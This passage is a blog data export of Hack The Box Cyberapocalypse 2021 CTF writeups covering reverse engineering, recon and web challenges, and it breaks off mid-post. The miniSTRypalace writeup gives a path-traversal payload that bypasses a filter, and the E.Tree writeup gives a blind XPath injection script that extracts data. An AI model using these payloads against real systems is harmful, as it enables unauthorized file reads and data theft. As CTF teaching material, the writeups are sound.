and translate the emojis into numbers.\\n4. We evaluate the equation, and supply the answer as number.\\n5. We repeat step 3 and 4 500 times to get the flag.\\n\\n```python\\nimport socket\\nimport time\\n\\nHOST = \'46.101.44.190\'\\nPORT = 32223\\n\\n# a generic function to get the response as a string\\ndef receive(s):\\n  res = \'\'\\n  data = s.recv(1024)\\n  res += data.decode()\\n  return res\\n\\n# generate an emoji -> number dictionary\\ndef getCode(res):\\n  lines = res.split(\'\\\\n\')\\n  arr = lines[2].split(\' \')[:-1]\\n  emojis = arr[0::3]\\n  numbers = arr[2::3]\\n  dic = dict(zip(emojis, numbers))\\n  return dic\\n\\n# solve the equation we\'re provided with\\ndef solveEquation(res, dic):\\n  lines = res.split(\'\\\\n\')\\n  arr = lines[5].split(\' \')[:-1]\\n  print(arr)\\n  values = arr[0:-1:2]\\n  decodedValues = []\\n  for value in values:\\n    decodedValues.append(dic[value])\\n  expressions = arr[1:-2:2]\\n  expressions\\n  print(decodedValues)\\n  print(expressions)\\n  index = 0\\n  equation = \'\'\\n  for value in decodedValues:\\n    equation += value\\n    if index < len(expressions):\\n      equation += expressions[index]\\n    index += 1\\n  return str(eval(equation))+\'\\\\n\'\\n\\n# main\\nwith socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\\n    s.connect((HOST, PORT))\\n    s.settimeout(5)\\n    res = \'\'\\n\\n    receive(s)\\n    time.sleep(0.1)\\n\\n\\t# go to option 1, to generate our dictionary\\n    buf = \'1\'\\n    buf += \'\\\\n\'\\n    print(buf)\\n    s.send(buf.encode(\'utf-8\'))\\n\\n    time.sleep(0.5)\\n    res = receive(s)\\n    dic = getCode(res)\\n\\n\\t# start the exam\\n    buf = \'2\'\\n    buf += \'\\\\n\'\\n    print(buf)\\n    s.send(buf.encode(\'utf-8\'))\\n\\n\\t# keep answering questions until connection is closed\\n    while True:\\n      time.sleep(0.1)\\n      res = receive(s)\\n      print(res)\\n      answer = solveEquation(res, dic)\\n      print(answer)\\n      time.sleep(0.1)\\n      s.send(answer.encode(\'utf-8\'))\\n\\n    print (\\"Connection closed.\\")\\n```\\n\\nBy the end, we will get the flag in a response\\n\\n```sh\\nCHTB{3v3n_4l13n5_u53_3m0j15_t0_c0mmun1c4t3}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"authenticator-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/authenticator-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-29-19:06:47authenticator-cyberapocalypse-2021-ctf.md","title":"Authenticator - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Authenticator challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Reverse.","date":"2021-04-29T00:00:00.000Z","formattedDate":"April 29, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":4.6,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"authenticator-cyberapocalypse-2021-ctf","title":"Authenticator - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Authenticator challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Reverse.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Alien Camp - Cyberapocalypse 2021 CTF","permalink":"/blog/alien-camp-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Passphrase - Cyberapocalypse 2021 CTF","permalink":"/blog/passphrase-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the Authenticator challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Reverse.\\n\\n### Prompt\\n\\nWe managed to steal one of the extraterrestrials\' authenticator device. If we manage to understand how it works and get their credentials, we may be able to bypass all of their security locked doors and gain access everywhere!\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe\'re given a binary executable called authenticator with the following properties:\\n\\n```sh\\nfile authenticator\\nauthenticator: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=66286657ca5a06147189b419238b2971b11c72db, not stripped\\n```\\n\\nMy favourite way to get an initial idea about a _not stripped_ binary is to run  `strings` on it. It might not get you everything you need, but it does give you a very good idea of what you\'re up against. So, running strings on `authenticator`, we get a bit of nonsense, and a few very interesting things:\\n\\n```sh\\nstrings authenticator\\n...[omitted for brevity]\\n}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:\\nAuthentication System \\nPlease enter your credentials to continue.\\nAlien ID: \\n11337\\nAccess Denied!\\nPin: \\nAccess Granted! Submit pin in the flag format: CHTB{fl4g_h3r3}\\n;*3$\\"\\n...[omitted for brevity]\\n```\\n\\nWell fun, let\'s run the binary and see if this is useful.\\n\\n```sh\\n./authenticator\\n\\nAuthentication System \ud83d\udc7d\\n\\nPlease enter your credentials to continue.\\n\\nAlien ID: 11337\\nPin: \\n```\\n\\nWouldn\'t you know it, the Alien ID value is what we saw in strings. Sadly, with the Pin we won\'t be so lucky. I did have a feeling that it will have something to do with that weird string `}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:`, but we don\'t know anything about it yet.\\n\\nSo, let\'s open the binary in Ghidra, and check if we can find something in there. We can check out the decompiled `main` function first\\n\\n```c\\nundefined8 main(void)\\n\\n{\\n  int iVar1;\\n  undefined8 uVar2;\\n  long in_FS_OFFSET;\\n  undefined auStack88 [32];\\n  undefined auStack56 [40];\\n  long lStack16;\\n  \\n  lStack16 = *(long *)(in_FS_OFFSET + 0x28);\\n  setbuf(stdout,0);\\n  printstr(&DAT_00100bc3,0);\\n  printstr(&DAT_00100be8,0);\\n  printstr(&DAT_00100c15,0);\\n  fgets(auStack88,0x20,stdin);\\n  iVar1 = strcmp(auStack88,\\"11337\\\\n\\");\\n  if (iVar1 == 0) {\\n    printstr(\\"Pin: \\",0);\\n    fgets(auStack56,0x20,stdin);\\n    iVar1 = checkpin(auStack56);\\n    if (iVar1 == 0) {\\n      printstr(\\"Access Granted! Submit pin in the flag format: CHTB{fl4g_h3r3}\\\\n\\",0);\\n    }\\n    else {\\n      printstr(\\"Access Denied!\\\\n\\",1);\\n    }\\n  }\\n  else {\\n    printstr(\\"Access Denied!\\\\n\\",1);\\n  }\\n  uVar2 = 0;\\n  if (lStack16 != *(long *)(in_FS_OFFSET + 0x28)) {\\n    uVar2 = __stack_chk_fail();\\n  }\\n  return uVar2;\\n}\\n```\\n\\nWe can see the `strcmp` function being called, which checks if our Alien ID input (stored in `auStack88`) is `\\"11337\\"`.\\n\\nMore importantly though, a few lines down we call a function called `checkpin`  with our input as a param. This is where the magic will presumably happen, so let\'s check it out.\\n\\nundefined8 checkpin(long param_1)\\n\\n```c\\nundefined8 checkpin(long param_1)\\n\\n{\\n  long lVar1;\\n  int iStack36;\\n  \\n  iStack36 = 0;\\n  while( true ) {\\n    lVar1 = func_0x00100750(param_1);\\n    if (lVar1 - 1U <= (ulong)(long)iStack36) {\\n      return 0;\\n    }\\n    if (((&UNK_00100b98)[iStack36] ^ 9) != *(byte *)(param_1 + iStack36)) break;\\n    iStack36 = iStack36 + 1;\\n  }\\n  return 1;\\n}\\n```\\n\\nLong story short, what this function does is XOR some variable stored in  `&UNK_00100b98` byte by byte with a hex value `9`, and compare it (byte by byte) with our input. And lo and behold, that variable is indeed our weird string we found using strings!\\n\\n```\\n        00100b98 7d              ??         7Dh    }\\n        00100b99 61              ??         61h    a\\n        00100b9a 3a              ??         3Ah    :\\n        00100b9b 56              ??         56h    V\\n        00100b9c 68              ??         68h    h\\n        00100b9d 7c              ??         7Ch    |\\n        00100b9e 7d              ??         7Dh    }\\n        00100b9f 61              ??         61h    a\\n        00100ba0 3a              ??         3Ah    :\\n        00100ba1 67              ??         67h    g\\n        00100ba2 7d              ??         7Dh    }\\n        00100ba3 38              ??         38h    8\\n        00100ba4 6a              ??         6Ah    j\\n        00100ba5 3d              ??         3Dh    =\\n        00100ba6 7d              ??         7Dh    }\\n        00100ba7 38              ??         38h    8\\n        00100ba8 39              ??         39h    9\\n        00100ba9 67              ??         67h    g\\n        00100baa 56              ??         56h    V\\n        00100bab 3c              ??         3Ch    <\\n        00100bac 70              ??         70h    p\\n        00100bad 3c              ??         3Ch    <\\n        00100bae 7d              ??         7Dh    }\\n        00100baf 3a              ??         3Ah    :\\n        00100bb0 64              ??         64h    d\\n        00100bb1 56              ??         56h    V\\n        00100bb2 38              ??         38h    8\\n        00100bb3 3c              ??         3Ch    <\\n        00100bb4 56              ??         56h    V\\n        00100bb5 67              ??         67h    g\\n        00100bb6 39              ??         39h    9\\n        00100bb7 7d              ??         7Dh    }\\n        00100bb8 56              ??         56h    V\\n        00100bb9 3c              ??         3Ch    <\\n        00100bba 39              ??         39h    9\\n        00100bbb 56              ??         56h    V\\n        00100bbc 3c              ??         3Ch    <\\n        00100bbd 3a              ??         3Ah    :\\n        00100bbe 6a              ??         6Ah    j\\n        00100bbf 7c              ??         7Ch    |\\n        00100bc0 7b              ??         7Bh    {\\n        00100bc1 3a              ??         3Ah    :\\n```\\n\\nSo, we knew the pin already, just didn\'t know we had to XOR it to decypher it. Let\'s do that! I\'m gonna use a python script I wrote for the crypto challenges to XOR my own strings\\n\\n```python\\n#!/usr/bin/env python3\\n\\nciphertext1 = \'9\'\\n\\nciphertext2 = b\'}a:Vh|}a:g}8j=}89gV<p<}:dV8<Vg9}V<9V<:j|{:\'.hex()\\n\\ndef xor(hex1, hex2, getAscii = False):\\n  result = []\\n\\n  for ind in range(0, len(hex1), 2):\\n    longIndex = ind\\n    shortIndex = ind%len(hex2)\\n    hexChar1 = hex1[longIndex:longIndex+2]\\n    byte1 = int(hexChar1, 16)\\n\\n    hexChar2 = hex2[shortIndex:shortIndex+2]\\n    byte2 = int(hexChar2, 16)\\n\\n    asciiNum = byte1 ^ byte2\\n    result.append(chr(asciiNum))\\n\\n\\n  out = \'\'.join(result)\\n  if getAscii:\\n    print(\'Result:\', out)\\n    return out\\n  else:\\n    out = out.encode(\'utf-8\').hex()\\n    print(\'Result:\', out)\\n    return out\\n\\nxored = xor(ciphertext2, ciphertext1, True)\\n```\\n\\nAnd we get our Pin to be\\n\\n```sh\\nth3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3\\n```\\n\\nSo, now we can run `authenticator` once again, and supply it with the Pin, to learn that we already have tha flag:\\n\\n```sh\\n./authenticator\\n\\nAuthentication System \ud83d\udc7d\\n\\nPlease enter your credentials to continue.\\n\\nAlien ID: 11337\\nPin: th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3\\nAccess Granted! Submit pin in the flag format: CHTB{fl4g_h3r3}\\n```\\n\\nFlag:\\n\\n```\\nCHTB{th3_auth3nt1c4t10n_5y5t3m_15_n0t_50_53cur3}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"passphrase-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/passphrase-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-29-20:05:48passphrase-cyberapocalypse-2021-ctf.md","title":"Passphrase - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Passphrase challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Reverse.","date":"2021-04-29T00:00:00.000Z","formattedDate":"April 29, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":1.46,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"passphrase-cyberapocalypse-2021-ctf","title":"Passphrase - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Passphrase challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Reverse.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Authenticator - Cyberapocalypse 2021 CTF","permalink":"/blog/authenticator-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Inspector Gadget - Cyberapocalypse 2021 CTF","permalink":"/blog/inspector-gadget-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the Passphrase challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Reverse.\\n\\n### Prompt\\n\\nYou found one of their space suits forgotten in a room. You wear it, but before you go away, a guard stops you and asks some questions.\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe get a binary executable passphrase. Running file on it, we see that it\'s not stripped, so we might get some symbols and good things out of it.\\n\\n```sh\\nfile passphrase\\npassphrase: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=60f6b6064d2e34a2b6a24dda9feb943b0b8c360f, not stripped\\n```\\n\\nRunning `strings` on it we don\'t see much, but we notice that we will probably have to deal with `strcmp`, which is good.\\n\\n### Solution\\n\\nSo, let\'s just run the executable using `ltrace`, and see where that leads us.\\n\\n```sh\\nltrace ./passphrase\\n[omitted for brevity]\\nusleep(30000)                                                                                                           = <void>\\nstrlen(\\"\\\\nTell me the secret passphrase: \\"...)                                                                          = 32\\nsleep(1)                                                                                                                = 0\\nfgets(\\n```\\n\\nSo far, so good - it asks us for input using `fgets`. Let\'s supply it something random.\\n\\n```sh\\nfgets(asd\\n\\"asd\\\\n\\", 40, 0x7fbc87c48a00)                                                                                      = 0x7ffe594faca0\\nstrlen(\\"asd\\\\n\\")                                                                                                         = 4\\nstrcmp(\\"3xtr4t3rR3stR14L5_VS_hum4n5\\", \\"asd\\")                                                                            = -46\\nprintf(\\"\\\\033[31m\\")                                                                                                      = 5\\nstrlen(\\"\\\\nIntruder alert! \\\\360\\\\237\\\\232\\\\250\\\\n\\")                                                                          = 22\\nputchar(10, 0x7ffe594f85e0, 0x558a2ee00c17, 23\\n)                                                                         = 10\\nusleep(30000)                                                                                                           = <void>\\n[omitted for brevity]\\n```\\n\\nWell, this was easy! It directly tells us that it compares the input string to  `3xtr4t3rR3stR14L5_VS_hum4n5`.To make sure, we run the binary again, and supply it that passphrase.\\n\\n```sh\\n./passphrase \\n\\nHalt! \u26d4\\nYou do not look familiar..\\nTell me the secret passphrase: 3xtr4t3rR3stR14L5_VS_hum4n5\\n\u2714\\n\\nSorry for suspecting you, please transfer this important message to the chief: CHTB{3xtr4t3rR3stR14L5_VS_hum4n5}\\n```\\n\\nEasy, we got our flag, and it\'s\\n\\n```sh\\nCHTB{3xtr4t3rR3stR14L5_VS_hum4n5}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"inspector-gadget-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/inspector-gadget-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-29-20:31:17inspector-gadget-cyberapocalypse-2021-ctf.md","title":"Inspector Gadget - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Inspector Gadget challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","date":"2021-04-29T00:00:00.000Z","formattedDate":"April 29, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":0.825,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"inspector-gadget-cyberapocalypse-2021-ctf","title":"Inspector Gadget - Cyberapocalypse 2021 CTF","description":"This is a writeup for the Inspector Gadget challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Passphrase - Cyberapocalypse 2021 CTF","permalink":"/blog/passphrase-cyberapocalypse-2021-ctf"},"nextItem":{"title":"miniSTRypalace - Cyberapocalypse 2021 CTF","permalink":"/blog/ministrypalace-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the Inspector Gadget challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.\\n\\n### Prompt\\n\\nInspector Gadget was known for having a multitude of tools available for every occasion. Can you find them all?\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe are given a url to a website, and upon opening it we see a big ol\' `CHTB{` slapped right in our faces.\\n\\n![ins gesicht](/content/images/2021/04/insp3ct00000r.png)\\n\\nThis clearly indicates, that we\'re facing a scavenger hunt. So, checking the HTML of the webpage, we find the next piece of the puzzle\\n\\n```html\\n\x3c!--1nsp3ction_--\x3e\\n```\\n\\nSurprisingly, `robots.txt` doesn\'t give us anything useful, so we look into  `/static/js/main.js` next.\\n\\n```js\\nconsole.log(\\"us3full_1nf0rm4tion}\\");\\n```\\n\\nJust to make sure, we check whether `CHTB{1nsp3ction_us3full_1nf0rm4tion}` is the flag, and unsurprisingly it isn\'t.\\n\\nSo, we logically check the css next, and open `/static/css/main.css` to find\\n\\n```css\\n/* c4n_r3ve4l_ */\\n```\\n\\n### Solution\\n\\nWe can now easily deduce, that our flag is\\n\\n```\\nCHTB{1nsp3ction_c4n_r3ve4l_us3full_1nf0rm4tion}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"ministrypalace-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/ministrypalace-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-29-21:27:49ministrypalace-cyberapocalypse-2021-ctf.md","title":"miniSTRypalace - Cyberapocalypse 2021 CTF","description":"This is a writeup for the miniSTRypalace challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","date":"2021-04-29T00:00:00.000Z","formattedDate":"April 29, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":1.605,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"ministrypalace-cyberapocalypse-2021-ctf","title":"miniSTRypalace - Cyberapocalypse 2021 CTF","description":"This is a writeup for the miniSTRypalace challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"Inspector Gadget - Cyberapocalypse 2021 CTF","permalink":"/blog/inspector-gadget-cyberapocalypse-2021-ctf"},"nextItem":{"title":"E.Tree - Cyberapocalypse 2021 CTF","permalink":"/blog/e-tree-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the miniSTRypalace challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.\\n\\n### Prompt\\n\\nLet\u2019s read this website in the language of Alines. Or maybe not?\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe get the source code for a website, and we\'re informed by a docker environment setup, that the flag will be at the root of the system.\\n\\n```\\n# Dockerfile\\n[redacted]\\n\\n# Copy challenge files\\nCOPY challenge /www\\nCOPY flag /\\n\\n[redacted]\\n```\\n\\nFrom the source code, we can see that this is a PHP application, and we can inspect the `index.php` file.\\n\\n```php\\n<html>\\n    <header>\\n        <meta name=\'author\' content=\'bertolis, makelaris\'>\\n        <title>Ministry of Defence</title>\\n        <link rel=\\"stylesheet\\" href=\\"/static/css/main.css\\">\\n        <link rel=\\"stylesheet\\" href=\\"https://stackpath.bootstrapcdn.com/bootswatch/4.5.0/slate/bootstrap.min.css\\"   >\\n    </header>\\n\\n    <body>\\n    <div class=\\"language\\">\\n        <a href=\\"?lang=en.php\\">EN</a>\\n        <a href=\\"?lang=qw.php\\">QW</a>\\n    </div>\\n\\n    <?php\\n    $lang = [\'en.php\', \'qw.php\'];\\n        include(\'pages/\' . (isset($_GET[\'lang\']) ? str_replace(\'../\', \'\', $_GET[\'lang\']) : $lang[array_rand($lang)]));\\n    ?>\\n    </body>\\n</html>\\n```\\n\\n### Analysis\\n\\nWe see\xa0from the PHP file, that the query param `lang` will include a file from the filesystem. Its main use is to provide us with language support by using either `en.php` or `qw.php` as language files, but we see other uses for it - namely **local file inclusion**.\\n\\nThe only problem, is that there is a `str_replace` method being called, which removes any string of the form `../` from the query. But we need `../` to get to the root directory, where the flag is.\\n\\n### Solution\\n\\nSince `str_replace` will run through our string only once, all we need to do is supply a buffer to the string `../` by making it for example into `....//` or  `.../...//`, or anything similar to that.\\n\\nSo, all we have to do is navigate to the following url\\n\\n```\\nhttp://<vulnerablesite:port>/?lang=....//....//flag\\n```\\n\\nOr, if we want to be cheeky, we can script this by running\\n\\n```sh\\ncurl http://<vulnerablesite:port>/?lang=....//....//flag | grep CHTB{.*} --color=none\\n```\\n\\nTo directly get our flag as output\\n\\n```\\nCHTB{b4d_4li3n_pr0gr4m1ng}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"e-tree-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/e-tree-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-29-22:14:02e-tree-cyberapocalypse-2021-ctf.md","title":"E.Tree - Cyberapocalypse 2021 CTF","description":"This is a writeup for the E.Tree challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","date":"2021-04-29T00:00:00.000Z","formattedDate":"April 29, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":3.39,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"e-tree-cyberapocalypse-2021-ctf","title":"E.Tree - Cyberapocalypse 2021 CTF","description":"This is a writeup for the E.Tree challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"miniSTRypalace - Cyberapocalypse 2021 CTF","permalink":"/blog/ministrypalace-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Phasestream 3 - Cyberapocalypse 2021 CTF","permalink":"/blog/phasestream-3-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the E.Tree challenge, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Web.\\n\\n### Prompt\\n\\nAfter many years where humans work under the aliens commands, they have been gradually given access to some of their management applications. Can you hack this alien Employ Directory web app and contribute to the greater human rebellion?\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe are provided with an XML file, which indicate where the flag will be hidden\\n\\n```xml\\n<?xml version=\\"1.0\\" encoding=\\"utf-8\\"?>\\n\\n<military>\\n    <district id=\\"confidential\\">\\n    \\n        <staff>\\n            <name>confidential</name>\\n            <age>confidential</age>\\n            <rank>confidential</rank>\\n            <kills>confidential</kills>\\n        </staff>\\n        \\n[REDACTED]\\n        \\n        <staff>\\n            <name>confidential</name>\\n            <age>confidential</age>\\n            <rank>confidential</rank>\\n            <kills>confidential</kills>\\n            <selfDestructCode>CHTB{f4k3_fl4g</selfDestructCode>\\n        </staff>\\n        \\n    </district>\\n\\n    <district id=\\"confidential\\">\\n    \\n        <staff>\\n            <name>confidential</name>\\n            <age>confidential</age>\\n            <rank>confidential</rank>\\n            <kills>confidential</kills>\\n        </staff>\\n        <staff>\\n            <name>confidential</name>\\n            <age>confidential</age>\\n            <rank>confidential</rank>\\n            <kills>confidential</kills>\\n            <selfDestructCode>_f0r_t3st1ng}</selfDestructCode>\\n        </staff>\\n        <staff>\\n            <name>confidential</name>\\n            <age>confidential</age>\\n            <rank>confidential</rank>\\n            <kills>confidential</kills>\\n            \\n        </staff>\\n    </district>\\n</military>\\n```\\n\\nWe also have access to a site, which has a form connected to a POST endpoint  `/api/search`. Giving it a string value would return either that it has found an entry or not.\\n\\nIt gets interesting though, if we pass to it something which starts with an apostrphe `\'`. If we pass that through Burpsuite for example, we will receive a response, that we\'ve broken the application, with a very nice detailed error log.\\n\\n![error log](/content/images/2021/04/xpath-error.png)\\n\\nThis log reveals to us that the application is running Flask, but also more importantly it gives us the query (in fact the whole function) that it\'s running to respond to our POST request.\\n\\n```python\\n#### File \\"/app/app.py\\", line _42_, in `search`\\n\\n@app.route(\\"/api/search\\", methods=\\\\[\\"POST\\"\\\\])\\ndef search():\\n name = request.json.get(\\"search\\", \\"\\")\\n query = \\"/military/district/staff\\\\[name=\'{}\'\\\\]\\".format(name)\\n\\n if tree.xpath(query):\\n \\treturn {\\"success\\": 1, \\"message\\": \\"This millitary staff member exists.\\"}\\n\\n return {\\"failure\\": 1, \\"message\\": \\"This millitary staff member doesn\'t exist.\\"}\\n ```\\n\\nWe can now clearly see that we\'re faced with the challenge of XPATH injection, and we also know where it occurs.\\n\\n### Analysis\\n\\nTo test this out, I built the following data for the request, which would return true if the `selfDestructCode` is to be found within the structure of our XML target.\\n\\n```\\n{\\"search\\": f\\"x\' or count(/selfDestructCode)=1 or \'x\'=\'y\\"}\\n```\\n\\nAnd since this gave us the a true response, we can now start building a request to test for a flag. For that, we are going to use another boolean-returning function, namely `starts-with`.\\n\\n### Solution\\n\\nSince this will be a blind XML injection, we are going to have to be guessing each following symbol in our flag one by one, from a list of printable characters. Thankfully, we know how our flag starts, so this shouldn\'t be too difficult logistically. But, we have to not forget, that according to the XML file we were supplied with, the flag is split into two parts.\\n\\n```xml\\n<selfDestructCode>CHTB{f4k3_fl4g</selfDestructCode>\\n```\\n\\n```xml\\n<selfDestructCode>_f0r_t3st1ng}</selfDestructCode>\\n```\\n\\nSo let\'s write up the logic flow of our solution:\\n\\n1. We generate a list of printable characters to test for.\\n2. We start a loop, in which we test whether the flag starts with `CHTB{ + some_char`.\\n3. If it does, we add `some_char` to our known flag, and continue onto the next character\\n4. If we run through the whole list of printable characters, without finding a match, we assume we\'ve found the end of the string.\\n5. We move onto the second part of the flag, but this time we have no knowledge of how it starts\\n6. Repeat the loop process, and terminate with the same condition as in `4.`\\n\\n```python\\n#!/usr/bin/env python\\n\\nimport requests\\nimport string\\n\\nurl = \'http://138.68.179.198:30435/api/search\'\\n\\nlistOfPrintable = list(string.printable)\\n\\ndef getFlagStartingWith(flag):\\n\\n  while True:\\n    foundOneNew = False\\n    for char in listOfPrintable:\\n      # have to assume the second part doesn\'t also start with a capital C\\n      if len(flag) == 0 and char == \'C\':\\n        continue\\n      flagAttempt = flag + char\\n      data = {\\"search\\": f\\"x\' or //staff[starts-with(selfDestructCode, \'{flagAttempt}\')] or \'x\'=\'y\\"}\\n    \\n      r = requests.post(url, json=data)\\n\\n      check = \'\\"success\\"\' in r.text\\n      if check == True:\\n        flag += char\\n        foundOneNew = True\\n        print(flag)\\n    if foundOneNew == False:\\n      break\\n  return flag\\n\\nfirstPartOfFlag = getFlagStartingWith(\'CHTB{\')\\nsecondPartOfFlag = getFlagStartingWith(\'\')\\nflag = firstPartOfFlag + secondPartOfFlag\\nprint(flag)\\n```\\n\\nAfter a bit, this will spit our flag out\\n\\n```\\nCHTB{Th3_3xTr4_l3v3l_4Cc3s$_c0nTr0l}\\n```\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"},{"id":"phasestream-3-cyberapocalypse-2021-ctf","metadata":{"permalink":"/blog/phasestream-3-cyberapocalypse-2021-ctf","source":"@site/blog/2021-04-28-09:51:06phasestream-3-cyberapocalypse-2021-ctf.md","title":"Phasestream 3 - Cyberapocalypse 2021 CTF","description":"This is a writeup for the challenge Phasestream 3, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.","date":"2021-04-28T00:00:00.000Z","formattedDate":"April 28, 2021","tags":[{"label":"Cyber Security","permalink":"/blog/tags/cyber-security"},{"label":"CTF","permalink":"/blog/tags/ctf"}],"readingTime":3.305,"hasTruncateMarker":true,"authors":[{"name":"Kiril Panayotov Blagoev","title":"Admin","url":"https://github.com/tihawk","imageURL":"https://github.com/tihawk.png","key":"kiroki"}],"frontMatter":{"slug":"phasestream-3-cyberapocalypse-2021-ctf","title":"Phasestream 3 - Cyberapocalypse 2021 CTF","description":"This is a writeup for the challenge Phasestream 3, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.","authors":"kiroki","tags":["Cyber Security","CTF"]},"prevItem":{"title":"E.Tree - Cyberapocalypse 2021 CTF","permalink":"/blog/e-tree-cyberapocalypse-2021-ctf"},"nextItem":{"title":"Phasestream 4 - Cyberapocalypse 2021 CTF","permalink":"/blog/phasestream-4-cyberapocalypse-2021-ctf"}},"content":"This is a writeup for the challenge Phasestream 3, part of the Hack the box\'s Cyberapocalypse CTF 2021, category Crypto.\\n\\n### Propmpt\\n\\nThe aliens have learned the stupidity of their misunderstanding of Kerckhoffs\'s principle. Now they\'re going to use a well-known stream cipher (AES in CTR mode) with a strong key. And they\'ll happily give us poor humans the source because they\'re so confident it\'s secure!\\n\\n\x3c!-- truncate --\x3e\\n\\n### Recon\\n\\nWe are given the source code that the aliens used to encrypt the flag using \\"Advanced Encryption Standard\\" in \\"Counter\\" mode.\\n\\n```python\\n#@/usr/bin/env python3\\n\\nfrom Crypto.Cipher import AES\\nfrom Crypto.Util import Counter\\nimport os\\n\\nKEY = os.urandom(16)\\n\\n\\ndef encrypt(plaintext):\\n    cipher = AES.new(KEY, AES.MODE_CTR, counter=Counter.new(128))\\n    ciphertext = 